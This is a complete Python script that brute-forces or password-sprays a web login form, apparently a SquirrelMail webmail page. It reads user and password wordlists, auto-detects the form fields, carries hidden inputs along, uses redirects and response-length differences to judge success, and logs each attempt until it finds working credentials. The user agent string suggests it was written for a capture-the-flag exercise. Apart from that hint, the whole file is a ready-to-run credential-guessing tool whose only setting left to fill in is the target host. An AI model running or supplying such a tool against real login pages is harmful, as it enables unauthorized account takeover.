#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import time
import sys
import urllib.parse
from pathlib import Path

# ========== CONFIG ==========
LOGIN_PAGE = "http://X.X.X./"       #CHANGE THIS
USERS_FILE = "users.txt"            #CHANGE THIS
PASS_FILE = "passwords.txt"         #CHANGE THIS

SUCCESS_MARKERS = ["Inbox", "Logout", "SquirrelMail", "Welcome"]
ALLOW_REDIRECT_AS_SUCCESS = True
SLEEP = 0.5
SPRAY_MODE = False
LOGFILE = "attempts.log"
TIMEOUT = 10

FORCE_USER_FIELD = None
FORCE_PASS_FIELD = None
# ============================

sess = requests.Session()
sess.headers.update({"User-Agent": "Mozilla/5.0 (ctf-bruter)"})


def get_login_form(url):
    r = sess.get(url, timeout=TIMEOUT)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find("form")
    return r, soup, form


def detect_fields(form):
    user_field = None
    pass_field = None
    hidden_inputs = {}

    if not form:
        return user_field, pass_field, hidden_inputs

    for inp in form.find_all("input", {"type": "hidden"}):
        name = inp.get("name")
        val = inp.get("value", "")
        if name:
            hidden_inputs[name] = val

    pwd = form.find("input", {"type": "password"})
    if pwd and pwd.get("name"):
        pass_field = pwd.get("name")

    candidates = []
    for inp in form.find_all("input"):
        n = inp.get("name")
        t = inp.get("type", "text")
        if not n:
            continue
        lower = n.lower()
        if any(k in lower for k in ("user", "login", "email", "account", "username")) and t != "hidden":
            candidates.append(n)
    if candidates:
        user_field = candidates[0]
    else:
        txt = form.find("input", {"type": "text"})
        if txt and txt.get("name"):
            user_field = txt.get("name")

    return user_field, pass_field, hidden_inputs


def build_action_url(form, base_url):
    action = form.get("action") if form else ""
    if not action:
        return base_url
    return urllib.parse.urljoin(base_url, action)


def is_success(response, baseline_len=None):
    if ALLOW_REDIRECT_AS_SUCCESS and response.status_code in (301, 302, 303, 307, 308):
        return True
    text = response.text or ""
    for m in SUCCESS_MARKERS:
        if m.lower() in text.lower():
            return True
    if baseline_len is not None:
        if abs(len(text) - baseline_len) > 100:
            return True
    return False


def log_attempt(user, pwd, ok, status, reason=""):
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {user}:{pwd} | ok={ok} | status={status} | {reason}\n"
    print(line, end="")
    with open(LOGFILE, "a") as f:
        f.write(line)


def main():
    if not Path(USERS_FILE).exists() or not Path(PASS_FILE).exists():
        print("users.txt or passwords.txt doesn't exist.")
        sys.exit(1)

    users = [l.strip() for l in open(USERS_FILE) if l.strip()]
    passwords = [l.strip() for l in open(PASS_FILE) if l.strip()]

    try:
        r, soup, form = get_login_form(LOGIN_PAGE)
    except Exception as e:
        print("Error fetching login page", e)
        sys.exit(1)

    user_field, pass_field, hidden_inputs = detect_fields(form)
    action_url = build_action_url(form, LOGIN_PAGE)

    if FORCE_USER_FIELD:
        user_field = FORCE_USER_FIELD
    if FORCE_PASS_FIELD:
        pass_field = FORCE_PASS_FIELD

    print("Form action:", action_url)
    print("Detected user field:", user_field)
    print("Detected pass field:", pass_field)
    print("Hidden inputs captured:", hidden_inputs.keys())

    if not pass_field:
        print("Pass Field not detected in auto, edit the FORCE_PASS_FIELD pls")
    if not user_field:
        print("User Field not detected in auto, edit the FORCE_USER_FIELD pls")

    baseline_user = "no_such_user_for_baseline_123"
    baseline_pass = "badpass123!"
    try:
        r_base = sess.get(LOGIN_PAGE, timeout=TIMEOUT)
        soup_base = BeautifulSoup(r_base.text, "html.parser")
        form_base = soup_base.find("form")
        _, _, hidden_base = detect_fields(form_base)
        action_base = build_action_url(form_base, LOGIN_PAGE)
        payload = hidden_base.copy()
        if user_field:
            payload[user_field] = baseline_user
        else:
            payload.update({"login_username": baseline_user, "username": baseline_user, "user": baseline_user})
        if pass_field:
            payload[pass_field] = baseline_pass
        else:
            payload.update({"secretkey": baseline_pass, "password": baseline_pass, "pass": baseline_pass})
        r_try = sess.post(action_base, data=payload, allow_redirects=True, timeout=TIMEOUT)
        baseline_len = len(r_try.text or "")
    except Exception as e:
        print("Error:", e)
        baseline_len = None

    if SPRAY_MODE:
        for pwd in passwords:
            for user in users:
                try:
                    r, soup, form = get_login_form(LOGIN_PAGE)
                    _, _, hid = detect_fields(form)
                    act = build_action_url(form, LOGIN_PAGE)
                    payload = hid.copy()
                    if user_field:
                        payload[user_field] = user
                    else:
                        payload.setdefault("login_username", user)
                        payload.setdefault("username", user)
                        payload.setdefault("user", user)
                    if pass_field:
                        payload[pass_field] = pwd
                    else:
                        payload.setdefault("secretkey", pwd)
                        payload.setdefault("password", pwd)
                    r2 = sess.post(act, data=payload, allow_redirects=False, timeout=TIMEOUT)
                    ok = is_success(r2, baseline_len)
                    log_attempt(user, pwd, ok, r2.status_code, reason="spray")
                    if ok:
                        print("[+] SUCCESS ->", user, pwd)
                        return
                except Exception as e:
                    print("Error:", e)
                time.sleep(SLEEP)
    else:
        for user in users:
            for pwd in passwords:
                try:
                    r, soup, form = get_login_form(LOGIN_PAGE)
                    _, _, hid = detect_fields(form)
                    act = build_action_url(form, LOGIN_PAGE)
                    payload = hid.copy()
                    if user_field:
                        payload[user_field] = user
                    else:
                        payload.setdefault("login_username", user)
                        payload.setdefault("username", user)
                        payload.setdefault("user", user)
                    if pass_field:
                        payload[pass_field] = pwd
                    else:
                        payload.setdefault("secretkey", pwd)
                        payload.setdefault("password", pwd)
                    r2 = sess.post(act, data=payload, allow_redirects=False, timeout=TIMEOUT)
                    ok = is_success(r2, baseline_len)
                    log_attempt(user, pwd, ok, r2.status_code)
                    if ok:
                        print("[+] SUCCESS ->", user, pwd)
                        return
                except Exception as e:
                    print("Error:", e)
                time.sleep(SLEEP)

    print("See the log in", LOGFILE, ".")


if __name__ == "__main__":
    main()
